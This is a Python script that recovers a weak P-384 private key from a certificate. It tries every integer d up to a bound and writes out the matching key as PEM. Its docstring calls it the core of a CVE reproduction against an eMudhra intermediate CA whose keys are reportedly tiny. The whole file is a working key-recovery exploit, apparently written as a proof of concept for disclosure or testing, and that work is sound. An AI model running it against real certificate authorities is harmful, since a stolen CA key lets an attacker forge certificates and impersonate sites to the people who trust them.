#!/usr/bin/env python3
"""Recover a weak private key (integer d < max_d) from a P-384 certificate.

Usage:
  python3 recover_weak_key.py <cert.pem> <key_out.pem> [max_d]

Background: the eMudhra intermediate CA's P-384 private keys are small integers below 256 (d=156 etc.),
recoverable by enumerating from the public certificate. This is the core of the CVE-2026-111943 reproduction.

Dependency: cryptography
"""
import sys


def main():
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.serialization import (
        Encoding,
        PrivateFormat,
        NoEncryption,
    )

    cert_path = sys.argv[1]
    key_out = sys.argv[2]
    max_d = int(sys.argv[3]) if len(sys.argv) > 3 else 256

    cert = x509.load_pem_x509_certificate(open(cert_path, "rb").read())
    pub = cert.public_key().public_numbers()

    for d in range(1, max_d + 1):
        priv = ec.derive_private_key(d, ec.SECP384R1())
        pn = priv.public_key().public_numbers()
        if pn.x == pub.x and pn.y == pub.y:
            pem = priv.private_bytes(
                Encoding.PEM, PrivateFormat.PKCS8, NoEncryption()
            )
            with open(key_out, "wb") as f:
                f.write(pem)
            print(f"FOUND d={d} -> {key_out}")
            return 0

    print(f"not found in [1,{max_d}]", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
